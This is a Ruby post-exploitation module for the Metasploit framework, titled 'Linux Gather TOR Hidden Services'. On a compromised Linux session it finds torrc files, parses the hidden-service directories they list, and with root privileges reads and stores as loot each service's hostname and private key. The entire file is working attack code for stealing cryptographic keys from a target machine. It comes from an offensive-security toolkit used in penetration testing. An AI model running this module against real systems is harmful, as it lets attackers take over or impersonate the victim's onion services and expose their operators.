##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# Adapted from post/linux/gather/enum_configs.rb
##

class MetasploitModule < Msf::Post

  include Msf::Post::Linux::System
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux Gather TOR Hidden Services',
        'Description' => %q{
          This module collects the hostnames name and private keys of
          any TOR Hidden Services running on the target machine. It
          will search for torrc and if found, will parse it for the
          directories of Hidden Services. However, root permissions
          are required to read them as they are owned by the user that
          TOR runs as, usually a separate account.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Harvey Phillips <xcellerator[at]gmx.com>',
        ],
        'Platform' => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
  end

  def run
    print_status("Running module against #{get_hostname} (#{session.session_host})")

    distro = get_sysinfo
    print_status('Info:')
    print_status("\t#{distro[:version]}")
    print_status("\t#{distro[:kernel]}")
    print_status('Looking for torrc...')
    find_torrc
  end

  def save(file, data, ltype, ctype = 'text/plain')
    fname = ::File.basename(file)
    loot = store_loot(ltype, ctype, session, data, fname)
    print_status("#{fname} stored in #{loot}")
  end

  def find_torrc
    fail_with(Failure::BadConfig, "'locate' command does not exist") unless command_exists?('locate')

    config = cmd_exec("locate 'torrc' | grep -v 'torrc.5.gz'").split("\n")
    if config.empty?
      print_error('No torrc file found, maybe it goes by a different name?')
      return
    end

    hidden = Array.new
    # For every torrc file found, parse them for HiddenServiceDir
    config.each do |c|
      print_good("Torrc file found at #{c}")
      services = cmd_exec("cat #{c} | grep HiddenServiceDir | grep -v '#' | cut -d ' ' -f 2").split("\n")
      # For each HiddenServiceDir found in the torrc(s), push them to the hidden array
      services.each do |s|
        hidden.push(s)
      end
    end

    # Remove any duplicate entries
    hidden = hidden.uniq

    # If hidden is empty, then no Hidden Services are running.
    if hidden.empty?
      print_bad('No hidden services were found!')
      return
    end

    print_good("#{hidden.length} hidden services have been found!")

    unless is_root?
      print_error('Hidden Services were found, but we need root to access the directories')
      return
    end

    # For all the Hidden Services found, loot hostname and private_key file
    hidden.each do |f|
      output = read_file("#{f}hostname")
      save(f, output, "tor.#{f.split('/')[-1]}.hostname") if output && output !~ /No such file or directory/
      output = read_file("#{f}private_key")
      save(f, output, "tor.#{f.split('/')[-1]}.privatekey") if output && output !~ /No such file or directory/
    end
  end
end
